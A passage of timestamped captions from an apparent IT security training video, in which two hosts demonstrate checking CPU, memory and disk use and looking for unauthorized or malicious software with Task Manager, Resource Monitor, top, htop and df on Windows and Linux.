right?\nSo you can just kind of look through here,\n\n129\n00:06:08.517 --> 00:06:13.147\nsee that there are 49 different processes,\n598 different threads, and so on and so\n\n130\n00:06:13.147 --> 00:06:17.412\nforth, how much up time has been going on.\nDo the same thing with memory.\n\n131\n00:06:17.412 --> 00:06:19.029\nIf you had multiple core,\n\n132\n00:06:19.029 --> 00:06:23.881\nI think I don't have multiple cores,\ncuz this is a virtual machine that we're\n\n133\n00:06:23.881 --> 00:06:26.740\nusing so.\n&gt;&gt; Yeah, but it is a great way to at least\n\n134\n00:06:26.740 --> 00:06:29.505\nstart your look.\nGotta figured out because when they tell\n\n135\n00:06:29.505 --> 00:06:32.914\nyou, hey, my system's running really\nslower, it's acting really strange.\n\n136\n00:06:32.914 --> 00:06:35.388\nAny one of these, discs, CPU, memory,\n\n137\n00:06:35.388 --> 00:06:39.987\nnetwork could lead to that performance\nissue, and you really don't have any\n\n138\n00:06:39.987 --> 00:06:42.365\nidea what it is yet.\nYou dive in here, and\n\n139\n00:06:42.365 --> 00:06:46.131\nlike it's the memory that's\ncausing my performance issues, or\n\n140\n00:06:46.131 --> 00:06:49.831\nI can see now that it's the CPU\nthat's causing those performance.\n\n141\n00:06:49.831 --> 00:06:52.116\nSo it's at least a good\nfirst start exact step.\n\n142\n00:06:52.116 --> 00:06:52.644\n&gt;&gt; Exactly,\n\n143\n00:06:52.644 --> 00:06:56.400\nget that 10,000 foot view really quickly,\nsee where the issue lies,\n\n144\n00:06:56.400 --> 00:06:58.697\nis it something that's\neating up the memory?\n\n145\n00:06:58.697 --> 00:07:02.424\nIs it something that's eating up CPU,\nis it something that's eating up both or\n\n146\n00:07:02.424 --> 00:07:03.714\nis it a hard drive problem?\n\n147\n00:07:03.714 --> 00:07:06.388\nThis could just, hey,\nyou filled up your hard drive, right?\n\n148\n00:07:06.388 --> 00:07:08.871\nYou've just been-\n&gt;&gt; It's not hardware at all it's just the-\n\n149\n00:07:08.871 --> 00:07:09.690\n&gt;&gt; Yeah, it could\n\n150\n00:07:09.690 --> 00:07:13.723\njust be that the user going crazy making\nfiles and downloading thing, so and\n\n151\n00:07:13.723 --> 00:07:17.524\nwe store your entire collection of\nmovies and stuff on your hard drive.\n\n152\n00:07:17.524 --> 00:07:18.280\n&gt;&gt; [LAUGH]\n\n153\n00:07:18.280 --> 00:07:20.010\n&gt;&gt; It will get full pretty quickly.\n\n154\n00:07:20.010 --> 00:07:21.064\nBelieve it or not, users do that on their\n\n155\n00:07:21.064 --> 00:07:21.676\nwork machine.\n&gt;&gt; Yeah,\n\n156\n00:07:21.676 --> 00:07:22.584\nonce in a while.\n&gt;&gt; Yeah.\n\n157\n00:07:22.584 --> 00:07:23.165\n[LAUGH]\n&gt;&gt; Once in a while.\n\n158\n00:07:23.165 --> 00:07:23.828\n&gt;&gt; Yeah, I've got a free computer right\n\n159\n00:07:23.828 --> 00:07:25.544\nhere, I've got the address.\n&gt;&gt; [LAUGH]\n\n160\n00:07:25.544 --> 00:07:26.650\n&gt;&gt; So I'm gonna use it.\n\n161\n00:07:26.650 --> 00:07:30.837\nSo there we go, we got that,\nlet's go back to the process system.\n\n162\n00:07:30.837 --> 00:07:35.634\nHere, we will be able to sort and\nsee what items are using up memory and\n\n163\n00:07:35.634 --> 00:07:38.716\nI will also see what\nprocesses are running.\n\n164\n00:07:38.716 --> 00:07:43.099\nSo just if I see anything weird and\nwe'll kind get to that in a second.\n\n165\n00:07:43.099 --> 00:07:45.808\nLet's talk a little more\nabout process consumption.\n\n166\n00:07:45.808 --> 00:07:50.634\nI can hit CPU and it will bring,\nit will start like ordering.\n\n167\n00:07:50.634 --> 00:07:54.550\nSo whatever is using up the most CPU\nwill now be the first on the list,\n\n168\n00:07:54.550 --> 00:07:58.085\nor I can hit it again and\nit'll reverse that action, right?\n\n169\n00:07:58.085 --> 00:08:00.432\nSo you can't really say, I don't\nhave a lot going on on this machine.\n\n170\n00:08:00.432 --> 00:08:02.426\nBut I want you to know that you can do it.\n\n171\n00:08:02.426 --> 00:08:06.432\nSame thing with memory, disk, and so\non and so forth, you can reorder them.\n\n172\n00:08:06.432 --> 00:08:10.088\nAnd you'll see that it has a little arrow\nright here letting you know we're going\n\n173\n00:08:10.088 --> 00:08:11.610\nfrom low to high, or high to low.\n\n174\n00:08:12.840 --> 00:08:16.100\nAll right, so now that that's happening,\nI do want to bring up a couple of other\n\n175\n00:08:16.100 --> 00:08:18.560\nresources that you have available\ninside of the Windows system.\n\n176\n00:08:18.560 --> 00:08:19.969\nWe'll jump to Linus here in just a second.\n\n177\n00:08:21.560 --> 00:08:26.655\nIf you just run the search, or the run,\nor whatever you have, and you do resmon,\n\n178\n00:08:26.655 --> 00:08:32.370\nand you hit return, and you get a bit\n\n179\n00:08:32.370 --> 00:08:37.780\nof a more in depth look at\nthe graphical kind of resources here.\n\n180\n00:08:37.780 --> 00:08:39.910\nLet me slide it back over here.\n\n181\n00:08:39.910 --> 00:08:44.041\nAnd now you certainly see, I still get\nthat graphical looking data in real-time.\n\n182\n00:08:44.041 --> 00:08:49.094\nSame idea, but now you'll notice,\nit kinda taken that processes tab and\n\n183\n00:08:49.094 --> 00:08:52.610\nthat performance tab and\nslapped it into one tool.\n\n184\n00:08:52.610 --> 00:08:55.420\nSo I can kind of start isolating things.\n\n185\n00:08:55.420 --> 00:08:58.588\nGive me a little more information\nof things that are going on here,\n\n186\n00:08:58.588 --> 00:09:01.598\ndifferent threads of CPU,\nhow much average time it's using.\n\n187\n00:09:01.598 --> 00:09:06.596\nSame thing with disk and network,\nI see things that are using\n\n188\n00:09:06.596 --> 00:09:11.625\nthe network, maybe I see\nsomething looks strange, right?\n\n189\n00:09:11.625 --> 00:09:14.909\nBut looking at the resource monitor could\nbe a very helpful look at there, and\n\n190\n00:09:14.909 --> 00:09:16.232\nwe also have memory down here.\n\n191\n00:09:16.232 --> 00:09:20.141\nSo you can basically do all the same\nthings that we saw in task manager,\n\n192\n00:09:20.141 --> 00:09:24.047\nat least for the visual look,\nwhat is this, how much is that using,\n\n193\n00:09:24.047 --> 00:09:27.780\nthere's the process ID, excellent,\nwhat are all these things?\n\n194\n00:09:27.780 --> 00:09:32.050\nHere's the commits,\nhere are the hard faults, working set,\n\n195\n00:09:32.050 --> 00:09:35.360\nhow much physical memory currently\nin use by the process in kilobytes,\n\n196\n00:09:35.360 --> 00:09:36.670\ngiving you all that great information.\n\n197\n00:09:36.670 --> 00:09:40.690\nSo you can try to run down something that\nmight be running away with performance on\n\n198\n00:09:40.690 --> 00:09:46.340\na machine, take a closer look, and\nthen go, I see that conhost.exe is,\n\n199\n00:09:46.340 --> 00:09:50.460\nlet's say it's using up 1.9 gigabytes\nof your 2 gigabytes of memory,\n\n200\n00:09:50.460 --> 00:09:53.450\ndo you know what that is?\n\n201\n00:09:53.450 --> 00:09:54.695\nNo?\nAnd if you don't, guess what you do?\n\n202\n00:09:54.695 --> 00:09:59.609\nYou grab your search engine of choice and\nyou type in [LAUGH],\n\n203\n00:09:59.609 --> 00:10:00.994\nconhost.exe-\n\n204\n00:10:00.994 --> 00:10:01.716\n&gt;&gt; Right.\n&gt;&gt; What\n\n205\n00:10:01.716 --> 00:10:02.505\nis it?\n&gt;&gt; [LAUGH]\n\n206\n00:10:02.505 --> 00:10:04.191\n&gt;&gt; And I think there's actually a website\n\n207\n00:10:04.191 --> 00:10:06.103\ncalled What Is It, or what Is-\n&gt;&gt; I believe so, yeah.\n\n208\n00:10:06.103 --> 00:10:07.123\n&gt;&gt; Something like that.\n\n209\n00:10:07.123 --> 00:10:09.120\nThey willl explain these things to you.\n\n210\n00:10:09.120 --> 00:10:12.802\nSo if you're not familiar with them,\nmaybe it is a known piece of malware and\n\n211\n00:10:12.802 --> 00:10:14.654\nthis is a known name for that malware.\n\n212\n00:10:14.654 --> 00:10:20.150\nNow, you can find whether or not that\nspecific process is malware or not.\n\n213\n00:10:20.150 --> 00:10:23.060\nAnd typically that's what we're talking\nabout, just like we were before.\n\n214\n00:10:23.060 --> 00:10:25.483\nMalware is most likely\nthe cause of these things.\n\n215\n00:10:25.483 --> 00:10:29.790\nCould be a user that is access it remotely\nso look for those network connections.\n\n216\n00:10:29.790 --> 00:10:32.516\nAnd if they're just maybe\nBitCoin mining or something,\n\n217\n00:10:32.516 --> 00:10:35.470\nwho knows what they're doing after that.\n\n218\n00:10:35.470 --> 00:10:36.080\nSo look for that.\n\n219\n00:10:36.080 --> 00:10:39.370\nAll right, let's jump over to the Linux\nworld for just a second here.\n\n220\n00:10:40.830 --> 00:10:43.495\nI do have a graphical system monitor.\n\n221\n00:10:43.495 --> 00:10:48.558\nIf I click on that, it'll bring it up\njust eventually, and we get the same kind\n\n222\n00:10:48.558 --> 00:10:53.424\nof idea that we saw with the resmon and\nthe task manager in Microsoft world.\n\n223\n00:10:53.424 --> 00:10:55.593\nHere we are in our Linux world,\n\n224\n00:10:55.593 --> 00:11:00.517\nI'm getting that real-time CPU Memory and\nswap, network history,\n\n225\n00:11:00.517 --> 00:11:05.490\nall the good stuff that we expect\nto see when I'm monitoring things.\n\n226\n00:11:05.490 --> 00:11:09.865\nAnd if I'm keeping an eye on stuff,\nI might have actual monitoring software in\n\n227\n00:11:09.865 --> 00:11:13.241\nplace to say, if X, Y or\nZ is happening, this is the Nagios,\n\n228\n00:11:13.241 --> 00:11:18.013\nthis is the Solarwinds, of the world, to\nsay, hey, I've noticed a super spike here\n\n229\n00:11:18.013 --> 00:11:22.851\non this machine, you may wanna check that\nout, and get that alert, get that texting,\n\n230\n00:11:22.851 --> 00:11:26.811\nor email, or whatever it is that\nlet's me know that it's happening.\n\n231\n00:11:26.811 --> 00:11:29.510\nAnd now, I can check that out.\n\n232\n00:11:29.510 --> 00:11:34.200\nIf I don't, I'm relying on a human element\nof, Mike is my user, giving me that call\n\n233\n00:11:34.200 --> 00:11:38.329\nsaying, something's weird with my\ncomputer, it's running really badly.\n\n234\n00:11:39.450 --> 00:11:43.210\nIf you don't have a graphical interface,\nyou are running inside of\n\n235\n00:11:43.210 --> 00:11:47.680\nthe Linux environment and typically\na lot of them are headless systems, but\n\n236\n00:11:47.680 --> 00:11:51.080\nthey do have those tools that are built in\n\n237\n00:11:51.080 --> 00:11:55.550\nto that area of the world that you can\npull up some of this information as well.\n\n238\n00:11:55.550 --> 00:11:58.430\nWe've looked at this before, good old top.\n\n239\n00:11:58.430 --> 00:11:59.030\nThere you go.\n\n240\n00:11:59.030 --> 00:12:02.050\nI can see the different\nthings that are running.\n\n241\n00:12:02.050 --> 00:12:03.490\nI've got all the different information,\n\n242\n00:12:03.490 --> 00:12:06.990\nlooking at my memory, my CPU,\nall that stuff is up there.\n\n243\n00:12:06.990 --> 00:12:10.714\nYou can look into more depth of\nhow top can show you things,\n\n244\n00:12:10.714 --> 00:12:13.988\ngive a little more human\nreadable functionality.\n\n245\n00:12:13.988 --> 00:12:16.171\nBut this isn't a show about tops,\n\n246\n00:12:16.171 --> 00:12:19.572\nit's show to let you know\nthat top does these things.\n\n247\n00:12:19.572 --> 00:12:21.060\nSo I'll leave you to that.\n\n248\n00:12:21.060 --> 00:12:22.894\nAnother one, again,\nwe love pretty top, which is htop.\n\n249\n00:12:22.894 --> 00:12:24.224\n&gt;&gt; [LAUGH]\n\n250\n00:12:24.224 --> 00:12:25.318\n&gt;&gt; htop.\n\n251\n00:12:25.318 --> 00:12:30.260\nAnd yes, see it's trying to nice things\nup for us, give us an idea of what\n\n252\n00:12:30.260 --> 00:12:35.320\nis using what, and I can see memory and\nCPU right in this area, right here.\n\n253\n00:12:35.320 --> 00:12:38.620\nI can click on many of these thing and\ntry to hold them in my view,\n\n254\n00:12:38.620 --> 00:12:42.680\nand go, hm, I need to look at this X-Org,\nwhat is that?\n\n255\n00:12:42.680 --> 00:12:43.760\nIt's the system.\n&gt;&gt; [LAUGH]\n\n256\n00:12:43.760 --> 00:12:45.595\n&gt;&gt; The computer that's right.\n\n257\n00:12:45.595 --> 00:12:50.960\nBut if I saw malware.exe,\nsomething strange I don't recognize,\n\n258\n00:12:50.960 --> 00:12:55.435\nthis is how I'm able to find those things\nthat I don't recognize that are running.\n\n259\n00:12:55.435 --> 00:13:00.140\nThe typical user out there doesn't\nrealize that there are processes that\n\n260\n00:13:00.140 --> 00:13:03.120\nrun in the background, they just say,oh,\nI'm not running anything.\n\n261\n00:13:04.370 --> 00:13:06.005\nWell, you kinda are.\n\n262\n00:13:06.005 --> 00:13:08.518\n[LAUGH]\n&gt;&gt; Let's take a look at what that is, and\n\n263\n00:13:08.518 --> 00:13:13.609\nwe should know that, as the security and\nIT professionals in our organizations,\n\n264\n00:13:13.609 --> 00:13:18.430\nto be able to say, hey, I know that,\nI know that, I know that, I know that.\n\n265\n00:13:18.430 --> 00:13:21.648\nI know the image that you're using,\ncuz that's how we give you computers,\n\n266\n00:13:21.648 --> 00:13:23.320\nwe image them, and we send them to you.\n\n267\n00:13:23.320 --> 00:13:26.370\nThey have X, Y, and Z processes that run.\n\n268\n00:13:26.370 --> 00:13:27.530\nI don't recognize that.\n\n269\n00:13:27.530 --> 00:13:29.300\nDid you install that?\n\n270\n00:13:29.300 --> 00:13:30.650\nOf course, you're gonna hear\n\n271\n00:13:30.650 --> 00:13:31.730\nan unabashed, no.\n&gt;&gt; [LAUGH]\n\n272\n00:13:31.730 --> 00:13:33.746\n&gt;&gt; No, never would I have even thought of\n\n273\n00:13:33.746 --> 00:13:36.520\ndoing something like that,\nand of course they did.\n\n274\n00:13:36.520 --> 00:13:37.792\nYou just got to listen.\n\n275\n00:13:37.792 --> 00:13:40.940\nYou got to be careful\nwhen you download things.\n\n276\n00:13:40.940 --> 00:13:44.132\nYou got to trust the source,\nmake sure they're verified and authorized\n\n277\n00:13:44.132 --> 00:13:48.002\nby our system, follow company policy, look\nonline, you can see the employee handbook\n\n278\n00:13:48.002 --> 00:13:51.109\nthat will tell you do not do this,\nlittle torrent master, all right?\n\n279\n00:13:51.109 --> 00:13:52.136\nStop it.\n&gt;&gt; [LAUGH]\n\n280\n00:13:52.136 --> 00:13:55.487\n&gt;&gt; So let's see here, a couple more tools.\n\n281\n00:13:55.487 --> 00:13:59.070\nLet's look at some more\nmemory consumption tools.\n\n282\n00:13:59.070 --> 00:14:01.579\nBasically, those are the guts.\n\n283\n00:14:01.579 --> 00:14:06.686\nIn Linux, if you get into disk space,\nyou do have the ability\n\n284\n00:14:06.686 --> 00:14:11.110\nI'm gonna quit out of htop here and\nclear my screen.\n\n285\n00:14:12.390 --> 00:14:16.437\nIf you want to look at the disk space,\nyou can do What is it?\n\n286\n00:14:16.437 --> 00:14:17.285\nA df?\n\n287\n00:14:17.285 --> 00:14:21.614\nYeah, a df-h, give it that human readable,\nso I can check the disk usage.\n\n288\n00:14:21.614 --> 00:14:24.866\nAnd I notice here's my\nhard drive right here, and\n\n289\n00:14:24.866 --> 00:14:30.211\nI'm able to see that the size is 77\ngigabytes used, 18 gigabytes available,\n\n290\n00:14:30.211 --> 00:14:35.880\n55 gigabytes, some of these temp fs's,\nsome looking for swap, I don't see that.\n\n291\n00:14:35.880 --> 00:14:39.030\nSo I probably just need to\ncreate a swap space on here,\n\n292\n00:14:39.030 --> 00:14:43.300\nmaybe this temp fs's is I would assume\nthat's what that is right there,\n\n293\n00:14:43.300 --> 00:14:46.260\neven though it doesn't show as swap space.\n\n294\n00:14:46.260 --> 00:14:51.966\nBut I can look at that and\nsay, 77 gigabytes used,\n\n295\n00:14:51.966 --> 00:14:55.850\n76.9 gigabytes, that's not good.\n\n296\n00:14:55.850 --> 00:15:00.386\nAnd I can start running down what\nis eating up so much of my space,\n\n297\n00:15:00.386 --> 00:15:02.580\nand just start looking for it.\n\n298\n00:15:02.580 --> 00:15:04.800\nNow, I know why my performance is bad.\n\n299\n00:15:04.800 --> 00:15:09.870\nA lot of times some viruses will fill\nup hard drives, just to be annoying.\n\n300\n00:15:12.240 --> 00:15:15.790\nIt could be a type of denial of service,\nwhere if I filled up my hard drive and\n\n301\n00:15:15.790 --> 00:15:20.420\nit's unable to do any kind of\nperformance or readwrites,\n\n302\n00:15:20.420 --> 00:15:24.300\nthen what ever service I may be running on\nthat hard drive would then, effectively,\n\n303\n00:15:24.300 --> 00:15:26.690\nbe denied to the person\nthat's trying to use it.\n\n304\n00:15:26.690 --> 00:15:28.000\nSo if you need to see that, it's there.\n\n305\n00:15:28.000 --> 00:15:30.260\nIn the Windows world,\nyou can go back here.\n\n306\n00:15:30.260 --> 00:15:34.440\nObviously, we had that\ndisc area right here.\n\n307\n00:15:34.440 --> 00:15:37.463\nYou can also just go into\nthe Let me close these.\n\n308\n00:15:37.463 --> 00:15:40.270\nJust go into the file explorer,\nthe Windows explorer, or\n\n309\n00:15:40.270 --> 00:15:42.090\nwhatever it's called now.\n\n310\n00:15:42.090 --> 00:15:43.750\nFile explorer, I guess it is.\n\n311\n00:15:43.750 --> 00:15:45.339\nGo to this PC and look,\n\n312\n00:15:45.339 --> 00:15:51.303\nthere's a nice graphical representation\nof what my drive is looking like, right?\n\n313\n00:15:51.303 --> 00:15:55.149\nYou right click, you can get some\nproperties, giving you a little more\n\n314\n00:15:55.149 --> 00:15:59.781\ndetail there, I think you know that, here\nis the used space, here is the free space.\n\n315\n00:15:59.781 --> 00:16:02.567\nEven a cool graphical representation.\n\n316\n00:16:02.567 --> 00:16:04.682\nBut if you see that\nthe drive is filled up,\n\n317\n00:16:04.682 --> 00:16:06.866\nyou can kind of work\nyour way through here.\n\n318\n00:16:06.866 --> 00:16:08.314\nIs it forensics, right click.\n\n319\n00:16:08.314 --> 00:16:11.009\nHit the Properties, and see, okay.\n\n320\n00:16:11.009 --> 00:16:15.810\nit's only 1.46Gb in size, so\nI know that's not my culprit.\n\n321\n00:16:15.810 --> 00:16:16.417\nDon't do that.\n\n322\n00:16:16.417 --> 00:16:18.110\nJust doing your due diligence.\n\n323\n00:16:18.110 --> 00:16:20.548\nI just clicked on something\nI don't know what I did.\n\n324\n00:16:20.548 --> 00:16:23.387\nHopefully it did not hurt anything.\n&gt;&gt; [LAUGH]\n\n325\n00:16:23.387 --> 00:16:25.503\n&gt;&gt; I love when those pop-up menus,\n\n326\n00:16:25.503 --> 00:16:30.413\nI jump out, as I try to move my arrow\naway from it, it actually followed me in,\n\n327\n00:16:30.413 --> 00:16:31.870\nI click for some sure.\n\n328\n00:16:33.050 --> 00:16:37.535\nAnyway, here we go, anything else that I\nwant to show you about that, looking for\n\n329\n00:16:37.535 --> 00:16:39.293\nunauthorized software right?\n\n330\n00:16:39.293 --> 00:16:41.780\nThis is a daily task, so much fun.\n\n331\n00:16:43.530 --> 00:16:46.432\nBring up the good old control panel.\n\n332\n00:16:46.432 --> 00:16:48.325\nControl panel, yep.\n\n333\n00:16:48.325 --> 00:16:52.695\nAnd you'll notice I typically keep\nmine in classic view, I'm just so\n\n334\n00:16:52.695 --> 00:16:55.180\ningrained with that classic view.\n\n335\n00:16:55.180 --> 00:16:58.206\nThat newer, I don't like the way\nkids are doing it nowadays.\n\n336\n00:16:58.206 --> 00:16:58.910\n&gt;&gt; No, no!\n\n337\n00:16:58.910 --> 00:17:03.428\nI get to remember what category this\nfalls under, and it changes too often.\n\n338\n00:17:03.428 --> 00:17:04.999\n&gt;&gt; I never got a hold of it.\n\n339\n00:17:04.999 --> 00:17:07.410\nThis just didn't sink into me.\n\n340\n00:17:07.410 --> 00:17:11.983\nSo I always go to classic view, and\nif I go to Programs and Features,\n\n341\n00:17:11.983 --> 00:17:14.566\nPrograms and Features, there we go.\n\n342\n00:17:14.566 --> 00:17:17.577\nI can look in to the Install Programs and\nsee, what is this?\n\n343\n00:17:17.577 --> 00:17:21.828\nAnd let me tell you what, I've actually\nhad to do this on more accounts than I can\n\n344\n00:17:21.828 --> 00:17:23.870\nthat I would like to tell you, right?\n\n345\n00:17:23.870 --> 00:17:26.353\nI've had to go, okay tell me\nabout Autopsy, what's Autopsy?\n\n346\n00:17:26.353 --> 00:17:27.470\nWhat do you use that for?\n\n347\n00:17:28.500 --> 00:17:31.155\nAnd they go I don't know.\n&gt;&gt; [LAUGH]\n\n348\n00:17:31.155 --> 00:17:33.323\n&gt;&gt; I don't know what that is.Okay good,\n\n349\n00:17:33.323 --> 00:17:36.962\nso you're saying let's open it up,\nlet's take a look at it.\n\n350\n00:17:36.962 --> 00:17:38.936\nThere's some weird stuff, what's this?\n\n351\n00:17:38.936 --> 00:17:43.160\nI don't recognize that at all,\ncool then we can delete it, right?\n\n352\n00:17:43.160 --> 00:17:47.537\nBecause maybe it's got adware,\nspyware or malware built into it.\n\n353\n00:17:47.537 --> 00:17:50.295\nA lot of these times you\ngo to install something,\n\n354\n00:17:50.295 --> 00:17:54.136\nthey piggyback a bunch of junk on with it.\n&gt;&gt; Yeah, I mean your end users,\n\n355\n00:17:54.136 --> 00:17:57.988\nthey're going Next, Next, Next, Next, and\nthey miss that little check box that says,\n\n356\n00:17:57.988 --> 00:18:01.454\nwould you like to also install this piece\nof software and this piece of software?\n\n357\n00:18:01.454 --> 00:18:04.579\nSo that, you know what they were doing\noriginally might have been okay,\n\n358\n00:18:04.579 --> 00:18:07.092\nsome authorized program that\nthey don't pay attention,\n\n359\n00:18:07.092 --> 00:18:08.598\nand not necessarily their fault.\n\n360\n00:18:08.598 --> 00:18:11.530\nWell I can't say it's not their fault,\nbut they should pay\n\n361\n00:18:11.530 --> 00:18:14.266\nattention, or we should teach them to.\n&gt;&gt; Untentionally their\n\n362\n00:18:14.266 --> 00:18:16.978\nfault, yeah.\n&gt;&gt; Yeah, easy to see how unknown software\n\n363\n00:18:16.978 --> 00:18:19.658\ncan get on a system.\n&gt;&gt; Exactly, so we need to be able to\n\n364\n00:18:19.658 --> 00:18:23.147\nwalk through these things and\ntake a look at what software is installed.\n\n365\n00:18:23.147 --> 00:18:25.446\nI can't tell you how many times viruses,\n\n366\n00:18:25.446 --> 00:18:30.350\nmalware will show up in the Install\nprograms, and you go, what's that?\n\n367\n00:18:30.350 --> 00:18:32.332\nI don't know.\nOkay, good, say goodbye to it and\n\n368\n00:18:32.332 --> 00:18:35.144\nhopefully you're able to right-click and\ndelete it.\n\n369\n00:18:35.144 --> 00:18:38.405\nIf not you gotta run the antivirus and\nthe anti-malware bytes for\n\n370\n00:18:38.405 --> 00:18:41.487\nthe world that so closes like Kaspersky,\nand the Symantec and\n\n371\n00:18:41.487 --> 00:18:44.997\nthat kind of stuff to help relieve that,\nand that is for another show.\n\n372\n00:18:44.997 --> 00:18:45.610\nAll right.\n\n373\n00:18:46.640 --> 00:18:48.667\nLet's see here, torrenting.\n\n374\n00:18:48.667 --> 00:18:50.873\nTorrent is a great way\nto get bad software.\n\n375\n00:18:50.873 --> 00:18:54.077\nA lot of people love the torrents because,\nguess what,\n\n376\n00:18:54.077 --> 00:18:57.690\npeople are trained in\nillegal things in torrents.\n\n377\n00:18:57.690 --> 00:19:01.772\nAnd if they're people that disregard\nthe law to such an extent that they\n\n378\n00:19:01.772 --> 00:19:06.412\nwould do that, what makes you think that\nthey wouldn't also do something else?\n\n379\n00:19:06.412 --> 00:19:09.600\nYou have to be very very careful\nif you're using torrent systems.\n\n380\n00:19:09.600 --> 00:19:14.535\nSo if I see BitTorrent or some torrent\nplan on here, and I've noticed that\n\n381\n00:19:14.535 --> 00:19:18.927\nthe performance is degradated in some,\ndegradated in some way.\n\n382\n00:19:18.927 --> 00:19:21.854\nI'm going to say hey,\nwhat's this torrent thing?\n\n383\n00:19:21.854 --> 00:19:23.281\nHey, I don't know what that is.\n\n384\n00:19:23.281 --> 00:19:25.990\nWhat's the file over here called Movies?\n&gt;&gt; [LAUGH]\n\n385\n00:19:25.990 --> 00:19:29.640\n&gt;&gt; You got me, yeah I did.\n\n386\n00:19:29.640 --> 00:19:30.700\nAll right, stop using torrents.\n\n387\n00:19:30.700 --> 00:19:34.624\nYou probably got a virus that way, let's\nupdate your anti-virus if we can or maybe\n\n388\n00:19:34.624 --> 00:19:38.228\nwe have to boot into safe mode, these\nare ways that you can get his hands off.\n\n389\n00:19:38.228 --> 00:19:43.809\nBut looking through here,\nlooking at those installed programs, and\n\n390\n00:19:43.809 --> 00:19:50.610\nLinux is not as easy because where stuff\ncan be installed, it doesn't have this.\n\n391\n00:19:50.610 --> 00:19:54.244\nSome do,\nI thin Kyle might have like a software.\n\n392\n00:19:54.244 --> 00:19:59.081\nYou look here just out of\ncuriosity cuz I'm not aware,\n\n393\n00:19:59.081 --> 00:20:02.880\nsometimes you'll see software updater.\n\n394\n00:20:04.370 --> 00:20:08.388\nBut here we go.\nNot something like this where you have\n\n395\n00:20:08.388 --> 00:20:13.370\na software store that's a GUI built in,\nyou log in.\n\n396\n00:20:13.370 --> 00:20:16.783\nIt's almost like an app store,\nthat kind of idea.\n\n397\n00:20:16.783 --> 00:20:19.540\nSo you can look in here and see,\nsorry something went wrong.\n\n398\n00:20:19.540 --> 00:20:21.738\nIt's probably cuz I do not have\nInternet access connected right now.\n\n399\n00:20:21.738 --> 00:20:26.403\nSo it is relying on that\nInternet to populate it out.\n\n400\n00:20:26.403 --> 00:20:27.969\nBut you might have that there, and\n\n401\n00:20:27.969 --> 00:20:31.580\nyou might be able to look through there\nto look for installed components.\n\n402\n00:20:31.580 --> 00:20:33.406\nHey look, there is a Install button.\n\n403\n00:20:33.406 --> 00:20:34.581\nThat might be helpful.\n\n404\n00:20:34.581 --> 00:20:38.010\nSo I don't know if we'll be able to do it\nagain without the Internet connection.\n\n405\n00:20:38.010 --> 00:20:40.347\nMight be relying on that for\nthis to do it.\n\n406\n00:20:40.347 --> 00:20:45.273\nOtherwise it's the old-fashioned\nlooking through the common area and\n\n407\n00:20:45.273 --> 00:20:47.303\nwhere things are installed.\n\n408\n00:20:47.303 --> 00:20:53.075\nWhich are bin, sbin, user/sbin,\nuser/bin, user/local/bin,\n\n409\n00:20:53.075 --> 00:20:57.128\nuser/local/sbin, and\nthe list goes on and on.\n\n410\n00:20:57.128 --> 00:20:59.985\nBut those are some of\nthe most typical places,\n\n411\n00:20:59.985 --> 00:21:03.069\neven Opt sometimes gets\nthings installed there.\n\n412\n00:21:03.069 --> 00:21:06.758\nSo there you go, obviously this is looking\nfor that Internet connection [INAUDIBLE].\n\n413\n00:21:06.758 --> 00:21:10.856\nBut again,\nsometimes you can just look at the ENVs,\n\n414\n00:21:10.856 --> 00:21:16.420\njust do ENV, and look for a path,\njust like a path, I guess.\n\n415\n00:21:16.420 --> 00:21:21.103\nAnd those are great place to start\nlooking for installed software.\n\n416\n00:21:21.103 --> 00:21:23.870\nSeeing if anything is there,\nlooking for any malfeasance.\n\n417\n00:21:23.870 --> 00:21:26.524\nBut unfortunately,\nwhen it comes to the Linux,\n\n418\n00:21:26.524 --> 00:21:30.606\ntypically things can be installed\nanywhere you want, whereas in a Windows\n\n419\n00:21:30.606 --> 00:21:34.384\nsystem typically, not that you\ncan't install in a different area.\n\n420\n00:21:34.384 --> 00:21:35.443\nYou can, you get that.\n\n421\n00:21:35.443 --> 00:21:37.827\nWould you like to install\nit in a default location or\n\n422\n00:21:37.827 --> 00:21:39.550\ndo you want to change that location?\n\n423\n00:21:39.550 --> 00:21:43.753\nAnd that can happen, but it's still not\na really good place to look it's in that\n\n424\n00:21:43.753 --> 00:21:45.903\nPrograms and Features area of Windows.\n\n425\n00:21:45.903 --> 00:21:47.439\nLet's see here.\n\n426\n00:21:47.439 --> 00:21:51.813\nWe can use centralized management\nto enforce software policy.\n\n427\n00:21:51.813 --> 00:21:54.180\nThis is probably a good idea, right?\n\n428\n00:21:54.180 --> 00:21:57.568\nLet's say, that's unauthorized,\nthis is authorized,\n\n429\n00:21:57.568 --> 00:22:00.223\nAnd never the twain shall meet,\nkind of idea.\n\n430\n00:22:00.223 --> 00:22:06.407\nSo in a Windows world you could use SCCM,\nSCOM or SCCM do this?\n\n431\n00:22:06.407 --> 00:22:08.338\nI can't remember.\n&gt;&gt; Yeah, Operations Manager,\n\n432\n00:22:08.338 --> 00:22:09.638\nI think they both might\nhave a little part in it.\n\n433\n00:22:09.638 --> 00:22:12.138\n&gt;&gt; There you go, there you go.\n\n434\n00:22:12.138 --> 00:22:13.315\n&gt;&gt; What else do they have?\n\n435\n00:22:13.315 --> 00:22:13.858\nGroup policy,\n\n436\n00:22:13.858 --> 00:22:16.520\nyou can enforce this kind of thing with-\n&gt;&gt; Things like App blocker\n\n437\n00:22:16.520 --> 00:22:19.237\nwhere I can block certain apps or\nyou can either white\n\n438\n00:22:19.237 --> 00:22:21.810\nlist or black list, but.\n&gt;&gt; Mike knows a little bit about Microsoft\n\n439\n00:22:21.810 --> 00:22:22.599\nif you didn't know that.\n\n440\n00:22:22.599 --> 00:22:26.038\nIf you need to learn about Microsoft\nSystems, you might wanna check out some of\n\n441\n00:22:26.038 --> 00:22:28.486\nour shows in our course library\nthat feature a one, Mr.\n\n442\n00:22:28.486 --> 00:22:29.399\nMike Rodric.\n&gt;&gt; [LAUGH]\n\n443\n00:22:29.399 --> 00:22:31.810\n&gt;&gt; Great stuff, too.\n\n444\n00:22:31.810 --> 00:22:35.418\nAny virus and any malware, they can\nalso do kind of like app monitoring,\n\n445\n00:22:35.418 --> 00:22:38.688\nblacklisting, white listing,\ndifferent pieces of software.\n\n446\n00:22:38.688 --> 00:22:42.338\nSo that you can say if it's\nnot these pieces of software,\n\n447\n00:22:42.338 --> 00:22:46.916\nthen it gets no play on my system,\nand it will detect that and stop that.\n\n448\n00:22:46.916 --> 00:22:50.094\nLet's see here, what else do we have?\n\n449\n00:22:50.094 --> 00:22:53.470\nOf course it would detect\nmalicious software for you.\n\n450\n00:22:53.470 --> 00:22:56.014\nThat's kind of the purpose of the 